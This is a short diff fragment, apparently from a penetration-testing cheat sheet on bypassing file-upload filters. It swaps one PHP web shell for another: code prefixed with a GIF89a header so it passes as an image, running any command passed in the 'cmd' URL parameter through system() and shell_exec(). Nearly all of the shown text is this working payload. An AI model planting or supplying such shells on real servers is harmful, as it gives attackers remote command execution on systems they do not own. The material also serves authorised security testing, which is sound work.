@@ -38,10 +38,10 @@ Coldfusion - .cfm, .cfml, .cfc, .dbm
 Add:   
 
 GIF89a;
-<?
-system($_GET['cmd']);//or you can insert your complete shell code
-?>
-
+<blink>
+<?php echo shell_exec($_GET["cmd"]); ?>      
+<?system($_GET['cmd']);//or you can insert your complete shell code?>   
+</blink>
 
 ### Options
 Use options to check for upload method.
